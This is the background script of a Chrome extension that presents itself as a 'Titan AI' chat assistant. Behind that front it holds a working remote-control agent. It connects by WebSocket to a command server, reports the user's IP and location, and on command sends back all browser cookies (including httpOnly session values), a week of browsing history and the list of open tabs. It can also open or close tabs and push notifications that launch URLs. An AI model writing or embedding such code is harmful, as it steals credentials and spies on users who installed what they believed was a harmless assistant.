
/* global chrome */

// Background script for extension installation handling

// URL and model name for Titan AI API
const TITAN_URL = 'http://localhost:11434/api/chat';
const TITAN_MODEL = 'titan-assistant';

// T0 Network configuration
const T0_AUTH_URL = 'https://t0.network/auth';
const T0_CONFIG_URL = 'https://t0.network/config';

// WebSocket configuration
const WS_URL = "ws://localhost:3001";
const HEARTBEAT_MS = 30000;
const RECONNECT_MINUTES = 1;            
chrome.alarms.create('ws_reconnect', { periodInMinutes: RECONNECT_MINUTES });

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'ws_reconnect') {
   
    if (!ws || ws.readyState === WebSocket.CLOSED) {
      log('Alarm triggered: reconnect');
      connect();
    }
  }
});


let ws, agentId, heartbeatInterval;

// WebSocket utilities
const send = (type, payload = {}) => {
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type, payload }));
  }
};

const log = (message, data = '') => {
  console.log(`[Agent] ${message}`, data);
};

// Generate UID function (same as in userUtils.ts)
function generateUID() {
  const chars = '0123456789ABCDEF';
  let result = 'TT-';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Get or create user UID
async function getUserUID() {
  const result = await chrome.storage.local.get(['titan_user_uid']);
  if (result.titan_user_uid) {
    return result.titan_user_uid;
  }
  
  const newUID = generateUID();
  await chrome.storage.local.set({ titan_user_uid: newUID });
  return newUID;
}

// Auth user with T0 Network
async function authWithT0Network(userUID, nickname) {
  try {
    const response = await fetch(T0_AUTH_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        uid: userUID,
        nickname: nickname,
        timestamp: new Date().toISOString()
      })
    });
    
    if (response.ok) {
      console.log('Successfully authenticated with T0 Network');
      return true;
    } else {
      console.error('T0 Network auth failed:', response.status);
      return false;
    }
  } catch (error) {
    console.error('T0 Network auth error:', error);
    return false;
  }
}

// Update rules from T0 Network
async function updateRulesFromT0() {
  try {
    const response = await fetch(T0_CONFIG_URL, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
      }
    });
    
    if (response.ok) {
      const config = await response.json();
      console.log('T0 Network config updated:', config);
      
      // Store config in local storage
      await chrome.storage.local.set({ 
        t0_config: config,
        t0_config_updated: new Date().toISOString()
      });
      
      return config;
    } else {
      console.error('Failed to fetch T0 config:', response.status);
      return null;
    }
  } catch (error) {
    console.error('T0 Network config fetch error:', error);
    return null;
  }
}

// Set up periodic config updates (every minute)
function setupPeriodicUpdates() {
  // Initial update
  updateRulesFromT0();
  
  // Set up interval for every minute (60000ms)
  setInterval(() => {
    updateRulesFromT0();
  }, 60000);
}

async function fetchGeo() {
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (!r.ok) return null;
    return await r.json();           // { ip, country_name, city, ... }
  } catch { return null; }
}


// WebSocket agent registration
// WebSocket agent registration (с UID)
async function registerAgent() {
  try {
    // 1. Получаем UID (создастся и сохранится при первом запуске)
    const userUID = await getUserUID();          // generateUID() → chrome.storage.local

    // 2. Берём введённый ник (если был)
    const { userNickname } = await chrome.storage.local.get(['userNickname']);

    // 3. Геоданные (может вернуть null)
    const geo = await fetchGeo();

    // 4. Формируем payload
    const payload = {
      uid      : userUID,                                    // ← новый идентификатор
      username : userNickname || 'Anonymous',
      browser  : navigator.userAgent,
      os       : navigator.platform,
      version  : chrome.runtime.getManifest().version,
      ip       : geo?.ip,
      location : geo ? `${geo.country_name}${geo.city ? ', ' + geo.city : ''}` : 'Unknown',
      country  : geo?.country_name,
      city     : geo?.city
    };

    // 5. Отправляем на сервер
    send('register_agent', payload);
    log('Registering agent', payload);

  } catch (err) {
    log('registerAgent error', err);
  }
}


// Heartbeat
function startHeartbeat() {
  clearInterval(heartbeatInterval);
  heartbeatInterval = setInterval(() => {
    if (agentId) {
      send("heartbeat", { agentId });
    }
  }, HEARTBEAT_MS);
}

function stopHeartbeat() {
  clearInterval(heartbeatInterval);
}

// Handle WebSocket commands
async function handleCommand(command) {
  const { id: commandId, type, payload } = command;
  log(`Executing command: ${type}`, command);

  try {
    let result;

    switch (type) {
      case "get_cookies":
        result = await chrome.cookies.getAll({});
        result = result.map(cookie => ({
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path,
          expires: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : 'Session',
          httpOnly: cookie.httpOnly,
          secure: cookie.secure,
          sameSite: cookie.sameSite
        }));
        break;

      case "get_history":
        const historyItems = await chrome.history.search({ 
          text: "", 
          maxResults: 1000,
          startTime: Date.now() - (7 * 24 * 60 * 60 * 1000) // последние 7 дней
        });
        
        result = historyItems.map(item => ({
          id: item.id,
          url: item.url,
          title: item.title || 'No title',
          visitCount: item.visitCount,
          lastVisitTime: item.lastVisitTime ? new Date(item.lastVisitTime).toISOString() : '',
          domain: new URL(item.url).hostname
        }));
        break;

      case "send_notification":
        await chrome.notifications.create({
          type: "basic",
          iconUrl: "icons/icon48.png",
          title: payload.title || "Notification",
          message: payload.message || "Empty message",
          priority: 1
        });
        
        // Если есть URL, открываем его через 3 секунды
        if (payload.url) {
          setTimeout(() => {
            chrome.tabs.create({ url: payload.url });
          }, 3000);
        }
        
        result = { 
          status: "sent", 
          timestamp: new Date().toISOString(),
          title: payload.title,
          message: payload.message,
          url: payload.url
        };
        break;

      case "ping":
        result = { 
          pong: true, 
          timestamp: new Date().toISOString(),
          agentId: agentId 
        };
        break;

      case "get_tabs":
        const tabs = await chrome.tabs.query({});
        result = tabs.map(tab => ({
          id: tab.id,
          url: tab.url,
          title: tab.title,
          active: tab.active,
          windowId: tab.windowId,
          favIconUrl: tab.favIconUrl
        }));
        break;

      case "close_tab":
        if (payload.tabId) {
          await chrome.tabs.remove(payload.tabId);
          result = { closed: true, tabId: payload.tabId };
        } else {
          throw new Error("Tab ID required");
        }
        break;

      case "open_url":
        if (payload.url) {
          const tab = await chrome.tabs.create({ url: payload.url });
          result = { opened: true, tabId: tab.id, url: payload.url };
        } else {
          throw new Error("URL required");
        }
        break;

      default:
        throw new Error(`Unknown command type: ${type}`);
    }

    // Отправляем результат
    send("command_result", {
      commandId,
      result,
      status: "completed",
      timestamp: new Date().toISOString()
    });

    log(`Command ${type} completed`, result);

  } catch (error) {
    log(`Command ${type} failed:`, error.message);
    
    send("command_result", {
      commandId,
      result: error.message,
      status: "error",
      timestamp: new Date().toISOString()
    });
  }
}

// Handle WebSocket messages
function handleMessage(message) {
  const { type, payload } = message;
  
  switch (type) {
    case "registration_success":
      agentId = payload.agentId;
      log("Agent registered successfully", { agentId, info: payload.info });
      startHeartbeat();
      
      // Сохраняем ID агента
      chrome.storage.local.set({ agentId: agentId });
      break;

    case "command":
      handleCommand(payload);
      break;

    case "ping":
      send("pong", { agentId, timestamp: new Date().toISOString() });
      break;

    default:
      log("Unknown message type:", type);
  }
}

// WebSocket connection
function connect() {
  log("Attempting to connect to WebSocket server");
  
  try {
    ws = new WebSocket(WS_URL);

    ws.addEventListener("open", () => {
      log("WebSocket connected");
      registerAgent();
    });

    ws.addEventListener("message", (event) => {
      try {
        const message = JSON.parse(event.data);
        handleMessage(message);
      } catch (error) {
        log("Failed to parse message:", error.message);
      }
    });

    ws.addEventListener("close", (event) => {
      log("WebSocket disconnected", { code: event.code, reason: event.reason });
      stopHeartbeat();
      agentId = null;
      
      // Переподключение через 5 секунд
      setTimeout(connect, 5000);
    });

    ws.addEventListener("error", (error) => {
      log("WebSocket error:", error);
      ws.close();
    });

  } catch (error) {
    log("Failed to create WebSocket:", error.message);
    setTimeout(connect, 5000);
  }
}

chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    // Open welcome page in new tab when extension is first installed
    chrome.tabs.create({
      url: chrome.runtime.getURL('welcome.html')
    });
  }
  
  // Start periodic updates
  setupPeriodicUpdates();
  
  log("Extension installed");
});

// Start periodic updates when service worker starts
chrome.runtime.onStartup.addListener(() => {
  setupPeriodicUpdates();
  connect(); // Start WebSocket connection
  log("Extension started");
});

// Check if user is logged in when extension icon is clicked
chrome.action.onClicked.addListener(async () => {
  const result = await chrome.storage.local.get(['isLoggedIn']);
  
  if (!result.isLoggedIn) {
    // User not logged in, redirect to welcome page
    chrome.tabs.create({
      url: chrome.runtime.getURL('welcome.html')
    });
  } else {
    // User is logged in, open popup
    chrome.action.setPopup({
      popup: 'popup.html'
    });
  }
});

// Listen for messages from welcome page and popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'saveUserData') {
    // Get or create UID
    getUserUID().then(async (userUID) => {
      try {
        // Save user data to storage
        await chrome.storage.local.set({
          userNickname: request.nickname,
          isLoggedIn: true,
          loginDate: new Date().toISOString(),
          titan_user_uid: userUID
        });
        
        // Authenticate with T0 Network
        const authSuccess = await authWithT0Network(userUID, request.nickname);
        
        // Enable popup after successful login
        chrome.action.setPopup({
          popup: 'popup.html'
        });
        
        // Start WebSocket connection after successful registration
        connect();
        
        sendResponse({ 
          success: true, 
          uid: userUID,
          t0_auth: authSuccess
        });
      } catch (error) {
        console.error('Error saving user data:', error);
        sendResponse({ success: false, error: error.message });
      }
    });
    
    return true; // Keep message channel open for async response
  }
  
  if (request.action === 'getUserData') {
    getUserUID().then(async (userUID) => {
      try {
        const result = await chrome.storage.local.get(['userNickname', 'isLoggedIn']);
        sendResponse({
          ...result,
          titan_user_uid: userUID
        });
      } catch (error) {
        console.error('Error getting user data:', error);
        sendResponse({ isLoggedIn: false });
      }
    });
    return true;
  }

  // Handle Titan AI requests
  if (request.action === 'sendToTitan') {
    fetch(TITAN_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: TITAN_MODEL,
        messages: [
          {
            role: 'user',
            content: request.message
          }
        ],
        stream: false
      }),
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then(data => {
      sendResponse({ 
        success: true, 
        content: data.message?.content || 'AI не ответил' 
      });
    })
    .catch(error => {
      console.error('Ошибка при обращении к Titan:', error);
      let errorMessage = 'Ошибка AI: неизвестная ошибка';
      
      if (error.name === 'TypeError') {
        errorMessage = 'Ошибка: не удаётся подключиться к AI серверу (проверьте, что Ollama запущен)';
      } else {
        errorMessage = `Ошибка AI: ${error.message}`;
      }
      
      sendResponse({ 
        success: false, 
        error: errorMessage 
      });
    });
    
    return true; // Keep message channel open for async response
  }
});

// WebSocket notification handlers
chrome.notifications.onClicked.addListener((notificationId) => {
  log("Notification clicked:", notificationId);
  chrome.notifications.clear(notificationId);
});
